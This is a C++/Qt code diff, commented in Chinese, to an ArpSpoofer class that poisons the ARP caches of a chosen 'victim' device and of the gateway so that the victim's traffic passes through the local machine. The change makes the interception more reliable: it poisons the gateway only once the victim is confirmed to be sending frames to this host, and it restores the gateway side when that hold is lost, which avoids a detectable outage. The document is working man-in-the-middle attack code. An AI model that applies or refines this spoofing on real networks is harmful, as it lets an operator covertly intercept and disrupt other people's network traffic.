@@ -113,6 +113,10 @@ void ArpSpoofer::startSpoof(const QString &victimMac, const QString &victimIp)
 
     const Target t{vmac, vip};
     m_victims.insert(victimMac.toLower(), t);
+    // ★ 从「没握住」起步：还没收到过这台设备发给本机的帧之前，不对网关投毒。
+    //   否则就是那个真机实证过的黑洞——网关已经把回程交给我们，设备却还指着真网关。
+    //   幂等重挂时也重置：上一轮的「握住」不能替这一轮背书（设备可能刚换址/刚重连）。
+    m_hold.insert(macKey6(reinterpret_cast<const uchar *>(vmac.constData())), HoldState{});
     sendSpoof(t); // 立刻抢占一次，别等下个 tick
     if (!m_timer->isActive())
         m_timer->start();
@@ -124,7 +128,8 @@ void ArpSpoofer::stopSpoof(const QString &victimMac)
     if (it == m_victims.end())
         return;
     if (configured())
-        healOne(it->mac, it->ip); // 先还原再移除
+        healOne(it->mac, it->ip); // 先还原再移除（healOne 的四帧已含网关那一侧）
+    m_hold.remove(macKey6(reinterpret_cast<const uchar *>(it->mac.constData())));
     m_victims.erase(it);
     if (m_victims.isEmpty()) {
         if (m_timer->isActive())
@@ -246,6 +251,7 @@ void ArpSpoofer::healAll()
             healOne(it->mac, it->ip);
     }
     m_victims.clear();
+    m_hold.clear(); // 与 m_victims 同生命周期，别留到下一轮劫持替新状态背书
     if (m_timer && m_timer->isActive())
         m_timer->stop();
     if (m_boostTimer && m_boostTimer->isActive())
@@ -329,6 +335,28 @@ void ArpSpoofer::reassertIsolation()
     m_endpoint->flushTx();
 }
 
+// 6 字节 MAC → quint64。只在本类内部用（存/取都走这一个函数），不与别处约定字节序。
+quint64 ArpSpoofer::macKey6(const uchar *mac6)
+{
+    quint64 k = 0;
+    for (int i = 0; i < 6; ++i)
+        k = (k << 8) | mac6[i];
+    return k;
+}
+
+void ArpSpoofer::noteVictimHeld(const uchar *mac6)
+{
+    if (!mac6)
+        return;
+    const quint64 key = macKey6(mac6);
+    // 只给**已在册**的 victim 记账：startSpoof 会先插一条空状态，这里 find 不到就说明调用方
+    // 传了个不该传的 MAC —— 不建新条目，免得这张表跟着链路上的噪声无界长大。
+    const auto it = m_hold.find(key);
+    if (it == m_hold.end())
+        return;
+    it->lastSeenMs = QDateTime::currentMSecsSinceEpoch();
+}
+
 void ArpSpoofer::sendSpoof(const Target &t)
 {
     if (!m_endpoint || !configured())
@@ -343,13 +371,33 @@ void ArpSpoofer::sendSpoof(const Target &t)
     //   这是「设备空闲后首次访问先失败/先走真路由」的根治：空闲期让缓存不掉、唤醒期让首包直接命中我们。
     const QByteArray requestToVictim =
         buildArpRequest(t.mac, m_localMac, m_localMac, m_gatewayIp, t.mac, t.ip);
-    // (b) 发给网关的欺骗 reply：sha=本机MAC，spa=victimIP → “victim IP 在本机”，回程走我们。
-    const QByteArray replyToGateway =
-        buildArpReply(m_gatewayMac, m_localMac, m_localMac, t.ip, m_gatewayMac, m_gatewayIp);
-
     m_endpoint->send(replyToVictim);
     m_endpoint->send(requestToVictim);
-    m_endpoint->send(replyToGateway);
+
+    // (b) 发给网关的欺骗 reply：sha=本机MAC，spa=victimIP → “victim IP 在本机”，回程走我们。
+    //
+    // ★ **只在「我们确实握着这台设备」时才发**（完整论证见 ArpSpoofer.h 的 noteVictimHeld）。
+    //   一句话版：(a)/(a2) 与 (b) 的生效难度极不对称 —— 路由器常醒、一两秒就吃下 (b)；手机会睡，
+    //   (a)/(a2) 可能很久不被采纳。两者之间那段窗口里，设备把包发给真网关、回包却被网关送来我们
+    //   这里，而我们没有对应连接 → 丢掉 → 设备双向断（WiFi/DHCP 全正常，就是上不去网）。
+    //   真机实证：路由器后台显示该手机的 MAC 就是本机 MAC，而手机不通。
+    const quint64 key = macKey6(reinterpret_cast<const uchar *>(t.mac.constData()));
+    HoldState &h = m_hold[key];
+    const bool held = h.lastSeenMs != 0
+            && (QDateTime::currentMSecsSinceEpoch() - h.lastSeenMs) <= kGatewayHoldTtlMs;
+    if (held) {
+        const QByteArray replyToGateway =
+            buildArpReply(m_gatewayMac, m_localMac, m_localMac, t.ip, m_gatewayMac, m_gatewayIp);
+        m_endpoint->send(replyToGateway);
+        h.gwPoisoned = true;
+    } else if (h.gwPoisoned) {
+        // 刚刚失去（设备倒回真网关，或干脆睡死了）→ 立刻把网关那一侧还原，别让回程继续黑洞。
+        // 只还网关侧：设备侧的投毒要继续，我们还在等它接受。此后设备走真网关直连 —— **能用**，
+        // 而不是黑洞。等 (a)/(a2) 生效、设备的帧重新发到本机，下一拍自然会把 (b) 重新装回去。
+        h.gwPoisoned = false;
+        for (const QByteArray &f : buildGatewayHealFrames(t.mac, t.ip))
+            m_endpoint->send(f);
+    }
     // 收口：本函数由 1s 周期 tick 和 50ms boost 两个定时器回调驱动，都不在收帧排空路径上。
     // boost 存在的意义是「设备邻居缓存刚老化、正在重新解析时抢在真网关前面」——再压 25ms
     // 就正好错过那个窗口。
@@ -386,12 +434,24 @@ QVector<QByteArray> ArpSpoofer::buildHealFrames(const QByteArray &victimMac,
         buildArpReply(victimMac, m_localMac, m_gatewayMac, m_gatewayIp, m_gatewayMac, m_gatewayIp);
     const QByteArray garpReqToVictim =
         buildArpRequest(victimMac, m_localMac, m_gatewayMac, m_gatewayIp, kZeroMac, m_gatewayIp);
-    const QByteArray garpToGateway =
-        buildArpReply(m_gatewayMac, m_localMac, victimMac, victimIp, victimMac, victimIp);
-    const QByteArray garpReqToGateway =
-        buildArpRequest(m_gatewayMac, m_localMac, victimMac, victimIp, kZeroMac, victimIp);
+    // 给网关那一侧的两帧拆成了独立函数（「失去设备」时要单独发它们，不能连设备侧一起还原），
+    // 这里复用它，保持「拼帧只有一份实现」这条纪律不变。
+    QVector<QByteArray> out{garpToVictim, garpReqToVictim};
+    out += buildGatewayHealFrames(victimMac, victimIp);
+    return out;
+}
 
-    return {garpToVictim, garpReqToVictim, garpToGateway, garpReqToGateway};
+QVector<QByteArray> ArpSpoofer::buildGatewayHealFrames(const QByteArray &victimMac,
+                                                       const QByteArray &victimIp) const
+{
+    if (!configured() || victimMac.size() != 6 || victimIp.size() != 4)
+        return {};
+    static const QByteArray kZeroMac(6, char(0));
+    // 「victim IP is-at victim 真实 MAC」的**无偿** ARP（sender IP == target IP），reply + request
+    // 各一份 —— 理由与上面那段完全相同（无偿才能无视 LOCKTIME 覆盖刚刷新过的表项；BSD/macOS
+    // 只认无偿 request）。eth 源 MAC 仍用本机 MAC：WiFi 站点模式发不出伪造源 MAC。
+    return {buildArpReply(m_gatewayMac, m_localMac, victimMac, victimIp, victimMac, victimIp),
+            buildArpRequest(m_gatewayMac, m_localMac, victimMac, victimIp, kZeroMac, victimIp)};
 }
 
 void ArpSpoofer::healOne(const QByteArray &victimMac, const QByteArray &victimIp)
